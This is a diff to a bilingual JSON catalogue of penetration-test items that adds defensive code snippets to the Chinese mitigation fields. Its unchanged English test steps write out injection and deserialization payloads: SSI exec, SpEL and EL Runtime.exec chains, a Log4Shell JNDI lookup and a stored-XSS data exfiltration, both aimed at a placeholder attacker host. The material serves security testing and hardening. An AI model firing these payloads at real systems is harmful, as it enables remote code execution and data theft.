@@ -35,7 +35,7 @@
      "en": "Submit the cos-system REDUCE opcode streams one by one per step 1 (payloads wrapping whoami/id-style commands in os.system), recording response and log differences; a hit is the corresponding command output appearing in responses or side effects after deserialization. Once execution is confirmed, read a marker file for evidence; decode Base64-transported entries before submitting. Distinguish ordinary decode errors, object-reconstruction exceptions, and genuine function invocation."
     },
     "mitigation": {
-     "zh": "跨信任边界改用 JSON 等只表达数据的格式；拒绝对外部输入调用 pickle.load 或 pickle.loads，并对历史队列执行来源认证和迁移；以最低权限隔离仍需读取的遗留数据。修复后重放第 1 步指令流，确认被拒绝且业务数据读取正常。",
+     "zh": "跨信任边界改用 JSON 等只表达数据的格式，禁止对外部输入调用 pickle.load(s)；遗留数据必须反序列化时用受限 Unpickler 白名单并以最低权限隔离：\n    import io, pickle, builtins\n    class RestrictedUnpickler(pickle.Unpickler):\n        def find_class(self, module, name):\n            if module == 'builtins' and name in {'range', 'sorted'}:\n                return getattr(builtins, name)\n            raise pickle.UnpicklingError(f'拒绝加载 {module}.{name}')\n    obj = RestrictedUnpickler(io.BytesIO(blob)).load()",
      "en": "Switch to data-only formats like JSON across trust boundaries; refuse pickle.load/pickle.loads on external input, and authenticate origins and migrate historical queues; isolate legacy data that must still be read with least privilege. After the fix, replay the step-1 opcode streams and confirm rejection while business data reads work normally."
     },
     "difficulty": "advanced"
@@ -518,7 +518,7 @@
      "en": "Submit the Base64-encoded Marshal strings one by one per step 1 (object chains embedding cmd-argument constructs), recording response and log differences; a hit is the corresponding command output (id/whoami) returned after Marshal.load executes. Once loading is confirmed, substitute equivalent object chains reading marker files for evidence; distinguish Base64 decode errors, unknown-class exceptions, and genuine object instantiation, and audit the loaded class list."
     },
     "mitigation": {
-     "zh": "优先把外部交换格式迁移为 JSON 或显式字段协议；对必须保留的 Marshal 数据使用服务端密钥认证并在消费前验证完整性和版本；缩小加载进程的依赖、权限与网络访问，并为 Marshal.load 调用和异常类实例化建立审计。修复后重放第 1 步串，确认被拒绝。",
+     "zh": "优先把外部交换迁移为 JSON 或显式字段协议；必须保留的 Marshal 数据先做服务端密钥认证与完整性校验，缩小加载进程权限并审计 Marshal.load 调用：\n    # Rails：优先已签名 JSON Cookie\n    Rails.application.config.action_dispatch.cookies_serializer = :json\n    # 遗留 blob 用 MessageVerifier 认证后再加载\n    verifier = ActiveSupport::MessageVerifier.new(\n      Rails.application.secret_key_base, serializer: Marshal)\n    data = verifier.verify(blob)  # 篡改抛 InvalidSignature",
      "en": "Prefer migrating external exchange formats to JSON or explicit field protocols; protect mandatory Marshal data with server-side key authentication and verify integrity and version before consumption; shrink loader-process dependencies, permissions, and network access, and audit Marshal.load calls and anomalous class instantiation. After the fix, replay the step-1 strings and confirm rejection."
     },
     "difficulty": "advanced"
@@ -803,7 +803,7 @@
      "en": "Use the step 1 command to submit Infinity, range, bulk-list, and $regex variants against authentication fields line by line; a row bypassing password checks and returning login success confirms that operator's authentication bypass. Record a 401 baseline with correct username plus wrong password first, submitting one operator structure per attempt and checking predicates and matched identity in database audit."
     },
     "mitigation": {
-     "zh": "对认证与查询 DTO 执行严格 JSON Schema 校验只允许标量与已声明字段，服务端显式构造数据库谓词，禁止把请求对象直接传给 find/findOne；启用对象键清洗、认证限速并监控含操作符键的请求。",
+     "zh": "对认证与查询 DTO 严格校验类型与字段，服务端显式构造谓词，请求对象不直传 find，认证限速并监控操作符键：\n    // Express + Joi：仅接受字符串标量\n    const { error, value } = Joi.object({\n      username: Joi.string().max(64).required(),\n      password: Joi.string().max(128).required()\n    }).unknown(false).validate(req.body);\n    if (error) return res.status(400).end();\n    users.findOne({ username: { $eq: value.username }, password: { $eq: value.password } });",
      "en": "Enforce strict JSON Schema validation on auth and query DTOs allowing only scalars and declared fields, construct database predicates explicitly server-side, and never pass request objects straight into find/findOne; enable object-key scrubbing, auth rate limits, and monitoring of operator-keyed requests."
     },
     "difficulty": "intermediate"
@@ -1069,7 +1069,7 @@
      "en": "Use the step 1 command to submit filter-closure variants like )(& and )(| line by line; filter errors, abnormally increased results, or changed query structure confirm injectable LDAP filters. Baseline result counts and server-side filters with one exactly-existing and one nonexistent account first, then compare matched identities, attribute scope, and LDAP audit logs per variant."
     },
     "mitigation": {
-     "zh": "使用支持参数绑定或安全过滤器构造的目录 API，按 LDAP Filter 与 DN 规则分别转义所有外部值，可查询属性设置允许列表；限制绑定账号可见范围，统一认证失败响应并记录异常查询。",
+     "zh": "使用支持参数绑定的目录 API，按 Filter 与 DN 两种上下文分别转义，绑定账号收敛到只读范围：\n    // Java (Spring LDAP)：过滤器值编码\n    String filter = \"(uid=\" + LdapEncoder.filterEncode(username) + \")\";\n    # Python (ldap3)：过滤器与 DN 分别转义\n    from ldap3.utils.conv import escape_filter_chars, escape_rdn\n    flt = \"(uid=\" + escape_filter_chars(username) + \")\"\n    dn = \"uid=\" + escape_rdn(username) + \",ou=users,dc=example,dc=com\"",
      "en": "Use directory APIs supporting parameter binding or safe filter construction, escape all external values per LDAP Filter and DN rules separately, and allowlist queryable attributes; restrict bind-account visibility, unify auth-failure responses, and log abnormal queries."
     },
     "difficulty": "intermediate"
@@ -1319,7 +1319,7 @@
      "en": "Inject <!--#exec cmd=\"id\"--> and similar directives into input fields the target accepts (comments, filenames, headers) per step 1 and request the rendered page; a hit is command output or file content inserted at the directive position, proving the server parsed SSI before returning. Record directive type and output position per sample, distinguishing comment-text echo, template-layer handling, and genuine server parsing; when exec is disabled, test echo and include directives instead and assess impact separately."
     },
     "mitigation": {
-     "zh": "在不需要的站点和目录禁用 SSI，尤其关闭 IncludesNOEXEC 之外的执行能力；把用户上传与生成内容放入不解析脚本和 SSI 的独立域及存储；对必须支持的占位符使用应用级固定模板。修复后重放第 1 步指令，确认输出为字面文本且无解析痕迹。",
+     "zh": "不需要 SSI 的站点和目录禁用 SSI，用户内容放独立域不解析脚本，必须支持时仅 IncludesNOEXEC：\n    # Apache：用户内容目录彻底关闭 SSI\n    <Directory \"/var/www/usercontent\">\n        Options -Includes -ExecCGI\n        RemoveType .shtml\n    </Directory>\n    # Nginx：确认未开启\n    ssi off;",
      "en": "Disable SSI where unneeded, especially closing execution beyond IncludesNOEXEC; place user uploads and generated content in separate domains and storage that parse neither scripts nor SSI; use application-level fixed templates for required placeholders. After the fix, replay the step-1 directives and confirm literal text output with no parsing traces."
     },
     "difficulty": "advanced"
@@ -1594,7 +1594,7 @@
      "en": "Submit ${T(java.lang.Runtime).getRuntime().exec('pwd')} and ProcessBuilder variants one by one to the target expression entry per step 1; a hit is the expression evaluating the command and returning output (uid= from id). When direct exec output is not echoed, use output redirection or out-of-band retrieval; after confirming reachability, record type-resolution and method-invocation capabilities layer by layer, distinguishing template interpolation from SpEL evaluation."
     },
     "mitigation": {
-     "zh": "不要把用户输入作为表达式源码；业务确需表达式时使用 SimpleEvaluationContext 或自定义受限上下文，只暴露固定变量、属性和函数；禁用类型引用、构造器与反射访问，运行于最低权限，并记录解析失败与异常类型访问。修复后重放第 1 步样例，确认 T() 被拒绝。",
+     "zh": "不把用户输入作为表达式源码；业务确需表达式时使用受限求值上下文，禁用类型引用、构造器与反射：\n    // Spring SpEL：只读数据绑定，无类型定位器与方法解析\n    Expression e = parser.parseExpression(rule);\n    EvaluationContext ctx = SimpleEvaluationContext\n        .forReadOnlyDataBinding().build();\n    Object v = e.getValue(ctx, dataBean);  // T()/new X() 直接抛异常",
      "en": "Never use user input as expression source; when expressions are required, use SimpleEvaluationContext or a custom restricted context exposing only fixed variables, properties, and functions; disable type references, constructors, and reflective access, run least-privileged, and log parse failures and anomalous type access. After the fix, replay the step-1 samples and confirm T() is rejected."
     },
     "difficulty": "advanced"
@@ -1971,7 +1971,7 @@
      "en": "Submit ${\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")} and similar reflection-chain variants one by one per step 1; a hit is EL evaluation executing the command with corresponding output. When exec output is not echoed, use redirection or out-of-band retrieval; first confirm the EL evaluation entry with constant computation (e.g., ${7*7}), then test object access and method invocation stage by stage, distinguishing front-end templates from JSP EL."
     },
     "mitigation": {
-     "zh": "禁止把外部值拼成 EL 源码或进行二次求值，只把它们作为已编码的数据模型属性；使用固定 JSP 表达式并限制自定义 ELResolver 暴露的 Bean 和方法；升级 Servlet/EL 实现，启用最低权限与出站限制，并审计异常表达式解析和反射访问。修复后重放第 1 步链，确认被拒绝。",
+     "zh": "禁止把外部值拼成 EL 源码或二次求值，只作为已编码的数据属性；自定义 ELResolver 拦截 class 导航并升级 EL 实现：\n    public class SafeELResolver extends ELResolver {\n        @Override public Object getValue(ELContext c, Object b, Object p) {\n            if (\"class\".equals(p) || \"getClass\".equals(p))\n                throw new PropertyNotFoundException(\"EL denied\");\n            return delegate.getValue(c, b, p);  // 委托默认解析链\n        }\n    }",
      "en": "Never splice external values into EL source or perform second-pass evaluation—keep them as encoded data-model attributes; use fixed JSP expressions and limit beans and methods exposed by custom ELResolvers; upgrade Servlet/EL implementations, enable least privilege and egress restrictions, and audit anomalous expression parsing and reflective access. After the fix, replay the step-1 chain and confirm rejection."
     },
     "difficulty": "advanced"
@@ -2230,7 +2230,7 @@
      "en": "Deploy a harmless DNS/LDAP observer attacker-side with unique request identifiers first, then inject ${jndi:ldap://{ATTACKER_HOST}/a} and the 1389/389/636 port variants into common log fields (User-Agent, X-Api-Version, etc.) per step 1; a hit is the target's resolution callback at your LDAP service or outbound records appearing. Correlate the unique identifier with application logs, resolution requests, and outbound traffic; ${jndi:...} merely being logged is not a trigger."
     },
     "mitigation": {
-     "zh": "升级到 Apache 公告认可的 Log4j 版本并清除旧副本；移除不需要的 JNDI Lookup 能力，网络层阻断到非授权 LDAP/RMI/DNS 的出口，集中记录 Lookup 异常与异常解析请求。修复后重放第 1 步注入，确认无回连。",
+     "zh": "升级到修复版本并清除旧副本；移除 Jndi Lookup 能力，网络层阻断到非授权 LDAP/RMI/DNS 出口并集中记录解析异常：\n    # 从 jar 移除 JNDI Lookup（所有副本与 fat-jar 内层均需处理）\n    zip -q -d log4j-core-*.jar \\\n        org/apache/logging/log4j/core/lookup/JndiLookup.class\n    # JVM 兜底：停用消息内 Lookup\n    -Dlog4j2.formatMessagesNoLookups=true",
      "en": "Upgrade to Log4j versions endorsed by the Apache advisory and purge old copies; remove unneeded JNDI lookup capability, block egress to unauthorized LDAP/RMI/DNS at the network layer, and centrally record lookup anomalies and anomalous resolution requests. After the fix, replay the step-1 injections and confirm zero callbacks."
     },
     "difficulty": "expert"
@@ -2505,7 +2505,7 @@
      "en": "Submit !!python/object/apply:os.system ['pwd'] and subprocess.check_output variants one by one to the target YAML parsing entry per step 1; a hit is yaml.load executing the function per the tag and returning command output. First confirm the parsing entry with a safe scalar document, then submit tag documents; on a miss, check the application's loader type (SafeLoader rejecting tags is expected), distinguishing unknown-tag errors from genuine object construction."
     },
     "mitigation": {
-     "zh": "对不可信 YAML 使用 safe_load 或安全 Loader，并显式允许业务需要的基础类型；删除通用对象构造标签和自定义危险 Constructor，升级解析库；将配置导入放在低权限、禁网、只读环境中，限制文档大小和别名深度并记录未知标签。修复后重放第 1 步文档，确认标签被拒绝。",
+     "zh": "对不可信 YAML 使用 safe_load 并显式允许业务基础类型，配置导入置于低权限只读环境，未知标签记录告警：\n    import yaml\n    data = yaml.safe_load(text)   # 仅基础类型，拒绝 !!python/object 标签\n    # 需要自定义标签时在 SafeLoader 上白名单注册\n    yaml.add_constructor('!env',\n        lambda l, n: os.environ.get(l.construct_scalar(n)), yaml.SafeLoader)",
      "en": "Use safe_load or a safe loader for untrusted YAML, explicitly allowing only business-needed base types; remove generic object-construction tags and custom dangerous Constructors, and upgrade parsing libraries; run config imports in low-privilege, no-network, read-only environments with document-size and alias-depth limits and unknown-tag logging. After the fix, replay the step-1 documents and confirm tags are rejected."
     },
     "difficulty": "advanced"
@@ -3080,7 +3080,7 @@
      "en": "Per step 1, submit the hex-encoded serialization streams (aced0005-prefixed) to the target deserialization point one by one; a hit is post-deserialization behavior diverging from the baseline (exceptions, delays, or command side effects). First confirm the entry accepts serialized bytes and record response differences, then keep the four stages distinct—magic recognition, class restoration, gadget triggering, and final side effects; compare against ysoserial-generated marker-command payloads to identify which chain works on the current classpath."
     },
     "mitigation": {
-     "zh": "跨信任边界停止使用 Java 原生序列化并迁移到显式数据协议；迁移期配置进程级与流级 ObjectInputFilter，只允许最小业务类型、深度、引用数和字节数；移除不需要的 Gadget 依赖并升级，隔离反序列化进程且监控拒绝事件和异常类加载。修复后重放第 1 步流，确认被过滤器拒绝。",
+     "zh": "跨信任边界停止 Java 原生序列化并迁移到显式数据协议；迁移期以流级 ObjectInputFilter 限定类型、深度与字节数：\n    ObjectInputStream ois = new ObjectInputStream(in);\n    ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(\n        \"com.app.msg.*;java.util.*;maxdepth=5;maxbytes=8192;!*\"));\n    Object msg = ois.readObject();  // 越界类型抛 InvalidClassException",
      "en": "Stop native Java serialization across trust boundaries and migrate to explicit data protocols; during migration configure process-level and stream-level ObjectInputFilters allowing only minimal business types, depth, references, and byte counts; remove unneeded gadget dependencies, keep upgrading, isolate deserialization, and monitor rejections and anomalous class loading. After the fix, replay the step-1 streams and confirm filter rejection."
     },
     "difficulty": "expert"
@@ -3347,7 +3347,7 @@
      "en": "Per step 1, submit the Base64-wrapped BinaryFormatter streams to the target deserialization entry one by one; a hit is type-resolution behavior changes during BinaryFormatter deserialization (exception-type shifts, delays, or side effects). First confirm the entry accepts binary/Base64 data and record response differences, then keep the stages distinct—Base64 decode, format recognition, type binding, and object instantiation; compare against harmless marker objects to check whether a binder or blacklist actually takes effect."
     },
     "mitigation": {
-     "zh": "删除 BinaryFormatter 等危险格式并迁移到显式契约的 JSON/protobuf；迁移期隔离旧读取器、认证消息来源并限制文件与网络权限，监控危险反序列化 API。修复后重放第 1 步流，确认被拒绝且无异常类型加载。",
+     "zh": "删除 BinaryFormatter 等危险格式并迁移到显式契约 JSON/protobuf，迁移期平台级禁用旧格式并监控危险 API：\n    # .NET 5+ runtimeconfig.json（保持默认禁用，勿开启）\n    \"System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization\": false\n    // .NET Framework 4.8 App.config：同义开关\n    <AppContextSwitchOverrides value=\n      \"Switch.System.Runtime.Serialization.UseUnsafeBinaryFormatterSerialization=false\"/>\n    var order = JsonSerializer.Deserialize<Order>(json);",
      "en": "Remove BinaryFormatter-style dangerous formats and migrate to explicit-contract JSON/protobuf; during migration isolate legacy readers, authenticate message origins, restrict file and network permissions, and monitor dangerous deserialization APIs. After the fix, replay the step-1 streams and confirm rejection with no anomalous type loading."
     },
     "difficulty": "expert"
@@ -3622,7 +3622,7 @@
      "en": "Upload a controlled Phar with serialized metadata disguised as shell.css/shell.svg extensions first, then submit phar:// paths to file functions like file_exists and getimagesize per step 1; a hit is metadata handling when phar:// is parsed (marker side effects or exception stacks). Record the triggering function and PHP version per path; all four—controllable archive, reachable function, applicable version, available gadget—must hold."
     },
     "mitigation": {
-     "zh": "拒绝外部输入中的非业务 URI 方案并规范化后校验真实路径；不对不可信归档调用 unserialize 或依赖自动元数据恢复，升级 PHP 和相关文件处理库；将上传文件放在不可执行、不可按 Phar 打开的隔离存储，移除危险魔术方法链并限制进程权限。修复后重放第 1 步路径，确认被拒绝。",
+     "zh": "拒绝外部输入中的非业务 URI 方案，规范化后校验真实路径前缀，上传文件隔离到不可执行存储：\n    // PHP：先断方案，再校验规范化路径\n    if (parse_url($path, PHP_URL_SCHEME) !== null) exit('scheme denied');\n    $real = realpath($path);\n    if ($real === false || strpos($real, '/srv/app/uploads/') !== 0)\n        exit('path denied');\n    stream_wrapper_unregister('phar');   // 不使用 phar 时彻底移除封装",
      "en": "Reject non-business URI schemes in external input and verify real paths after normalization; never unserialize untrusted archives or rely on automatic metadata restoration, and upgrade PHP and file-processing libraries; keep uploads in isolated, non-executable storage that cannot be opened as Phar, remove dangerous magic-method chains, and limit process permissions. After the fix, replay the step-1 paths and confirm rejection."
     },
     "difficulty": "advanced"
@@ -3897,7 +3897,7 @@
      "en": "Per step 1, submit JSON containing the _$$ND_FUNC$$_ prefix with child_process.execSync('id') to the target deserialization entry one by one; a hit is the embedded function executing immediately on deserialization and returning command output. First confirm whether the dependency is a function-restoring library (e.g., legacy node-serialize) and its call sites, then deliver; child_process appearing in a string is not evidence—corroborate with actual execution output and module-load logs."
     },
     "mitigation": {
-     "zh": "删除支持函数恢复的不安全序列化包，仅接受标准 JSON 类型并严格校验 Schema；禁止 eval、new Function 和 vm 执行外部文本，固定依赖版本并审计异常模块加载与子进程创建。修复后重放第 1 步 JSON，确认被拒绝。",
+     "zh": "删除支持函数恢复的不安全序列化包，仅接受标准 JSON 类型并做 Schema 校验，禁止 eval/new Function：\n    const data = JSON.parse(raw);               // 天然无函数语义\n    const { error, value } = schema.validate(data);\n    if (error) return res.status(400).end();\n    if (raw.includes('_$$ND_FUNC$$_'))          // 攻击标记残留\n        audit.alert('unsafe-deserialize', req.ip);",
      "en": "Remove unsafe serialization packages supporting function restoration, accepting only standard JSON types with strict schema validation; forbid eval, new Function, and vm on external text, pin dependency versions, and audit anomalous module loads and child processes. After the fix, replay the step-1 JSON and confirm rejection."
     },
     "difficulty": "advanced"
@@ -4322,7 +4322,7 @@
      "en": "Use the step 1 command to submit startswith/contains lookup injections against the password field character by character; stable response differences between hit and miss characters confirm injectable ORM lookups enabling bit-by-bit enumeration. Baseline with the documented username exact filter recording normal results and SQL first, submitting one lookup per attempt to avoid bulk guessing."
     },
     "mitigation": {
-     "zh": "为每个端点定义固定筛选 DTO 只映射允许字段与 lookup，禁止直接展开 request.data/query_params 与客户端 order_by；敏感模型执行对象级授权，统一无匹配响应并审计双下划线键与高频前缀查询。",
+     "zh": "为每个端点定义固定筛选 DTO 只映射允许字段与 lookup，禁止直接展开 request.data，敏感模型执行对象级授权并审计双下划线键：\n    # DRF + django-filter：字段与 lookup 双锁定\n    class UserFilter(django_filters.FilterSet):\n        class Meta:\n            model = User\n            fields = {'username': ['exact']}   # 唯一放行的组合\n    qs = UserFilter(request.GET, queryset=User.objects.all()).qs",
      "en": "Define fixed filter DTOs per endpoint mapping only allowed fields and lookups, forbidding direct expansion of request.data/query_params and client order_by; apply object-level authorization on sensitive models, unify no-match responses, and audit double-underscore keys and high-frequency prefix queries."
     },
     "difficulty": "intermediate"
@@ -4573,7 +4573,7 @@
      "en": "In step 1, build cross-relation prefix-match queries against a target username per the script and observe hits; filterable related fields or readable differentials confirm attribute-level over-querying, narrowing prefix matches to recover concrete values. Judge success by field values recovered from differentials. Replace placeholders via the global variables menu; target objects use synthetic data."
     },
     "mitigation": {
-     "zh": "过滤器白名单限定可查询字段与关系深度，禁用客户端控制的 ORM 路径并统一走序列化层校验。修复后重放第 1 步，跨关系路径应被拒绝且无差异可读。",
+     "zh": "过滤器白名单限定可查询字段与关系深度，禁用客户端控制的 ORM 路径并统一走序列化层校验：\n    ALLOWED = {'username', 'email', 'status'}   # 不含关系字段\n    def safe_filters(params):\n        return {k: v for k, v in params.items()\n                if k in ALLOWED and '__' not in k and isinstance(v, str)}\n    qs = User.objects.filter(**safe_filters(request.GET.dict()))",
      "en": "Whitelist filterable fields and relation depth, forbidding client-controlled ORM paths and routing all queries through serializer-level checks. After the fix, replay step 1: cross-relation paths should be rejected with no readable differentials."
     },
     "difficulty": "advanced"
@@ -4824,7 +4824,7 @@
      "en": "In step 1, submit queries selecting sensitive fields such as passwords and tokens one by one per the script, recording response fields; private fields returning confirm unconstrained query shapes, then extend related objects via include to retest depth. Judge success by the response-field matrix. Replace placeholders via the global variables menu."
     },
     "mitigation": {
-     "zh": "查询形状由服务端固定模板生成，客户端仅传标量参数；select 与 include 完全收归服务端控制。修复后重放第 1 步，敏感字段应永不出现在响应中。",
+     "zh": "查询形状由服务端固定模板生成，客户端仅传标量参数，select 与 include 完全收归服务端：\n    // 服务端固定 select，客户端只能传 username 标量\n    const user = await prisma.user.findFirst({\n      where: { username: String(req.body.username).slice(0, 64) },\n      select: { id: true, username: true, displayName: true }\n    });   // password/email 等敏感字段永不进入 select",
      "en": "Generate query shapes from fixed server templates with clients passing scalar parameters only, keeping select and include fully server-controlled. After the fix, replay step 1: sensitive fields should never appear in responses."
     },
     "difficulty": "intermediate"
@@ -5075,7 +5075,7 @@
      "en": "In step 1, probe GWT and RPC paths one by one per the script, recording response signatures; RPC framework errors or service descriptions confirm live endpoints, then call unauthenticated to verify whether independent authorization exists. Judge success by the live-endpoint inventory. Replace placeholders via the global variables menu; make read-only calls only against live endpoints."
     },
     "mitigation": {
-     "zh": "退役未使用的 RPC 服务并按主站同一鉴权中间件覆盖全部路径，对框架特征响应做统一 404。修复后重放第 1 步，探测应无任何特征响应。",
+     "zh": "退役未使用的 RPC 服务并按主站同一鉴权中间件覆盖全部路径，对框架特征请求统一 404：\n    # Nginx：特征路径一律 404\n    location ~ ^/gwt(/|$) { return 404; }\n    # web.xml：删除遗留 servlet 映射\n    <servlet-mapping><servlet-name>rpcService</servlet-name>\n        <url-pattern>/gwt/*</url-pattern></servlet-mapping>",
      "en": "Retire unused RPC services, cover every path with the main site's authentication middleware, and normalize framework-signature responses to 404. After the fix, replay step 1: probing should surface no signature responses."
     },
     "difficulty": "intermediate"
@@ -5306,7 +5306,7 @@
      "en": "In step 1, connect across the common RMI port range per the script and identify challenge or handshake responses; on hits, record listening hosts and bound objects, then attempt unauthenticated object listing to verify access control. Judge success by live ports and the object inventory. Replace placeholders via the global variables menu; confine probing to authorized segments."
     },
     "mitigation": {
-     "zh": "RMI 服务绑定内网管理段并启用 SSL 与调用方认证，升级 JDK 反序列化过滤，对 Registry 访问做网络白名单。修复后重放第 1 步，目标网段应无握手响应。",
+     "zh": "RMI 绑定内网管理段并启用 SSL 与调用方认证，主机防火墙白名单限源，JDK 全局序列化过滤兜底：\n    # firewalld：仅管理段可访问 Registry\n    firewall-cmd --permanent --add-rich-rule='rule family=ipv4 source address=10.10.0.0/24 port port=1099 protocol=tcp accept'\n    # JVM 全局反序列化过滤 + 禁远程代码库\n    -Djdk.serialFilter='java.lang.*;java.util.*;java.rmi.*;sun.rmi.*;!*'\n    -Dcom.sun.jndi.rmi.object.trustURLCodebase=false",
      "en": "Bind RMI services to internal management segments with SSL and caller authentication, apply JDK deserialization filters, and network-whitelist Registry access. After the fix, replay step 1: target segments should show no handshake responses."
     },
     "difficulty": "intermediate"
@@ -5703,7 +5703,7 @@
      "en": "Use the step 1 command to inject exfiltration and event payloads into storage points like comments, then wait for an administrator view to trigger; data reaching {ATTACKER_HOST} or a popup flag under the admin session confirms stored XSS in the high-privilege view. Confirm the database value and admin-page DOM with a random plain-text marker first, then observe execution and CSP reports in an isolated admin browser without touching real sessions."
     },
     "mitigation": {
-     "zh": "按 HTML 文本、属性、URL 与 JS 上下文分别编码输出，富文本走维护中消毒器与最小允许列表，部署 nonce/hash CSP 并给会话 Cookie 设置 HttpOnly/SameSite；回归覆盖所有后台、导出与通知 Sink。",
+     "zh": "按 HTML 文本、属性、URL 与 JS 上下文分别编码，富文本走消毒器与最小允许列表，部署严格 CSP，会话 Cookie 设 HttpOnly/SameSite：\n    // Java (OWASP Encoder)：按上下文输出\n    out.print(Encode.forHtml(item.getName()));\n    String attr = \" title=\\\"\" + Encode.forHtmlAttribute(v) + \"\\\"\";\n    # Nginx：严格 CSP（禁止内联脚本与外带）\n    add_header Content-Security-Policy \"default-src 'self'; object-src 'none'; base-uri 'none'\" always;",
      "en": "Encode output per HTML text, attribute, URL, and JS contexts, run rich text through maintained sanitizers with minimal allowlists, deploy nonce/hash CSP with HttpOnly/SameSite session cookies; regression must cover every admin, export, and notification sink."
     },
     "difficulty": "advanced"
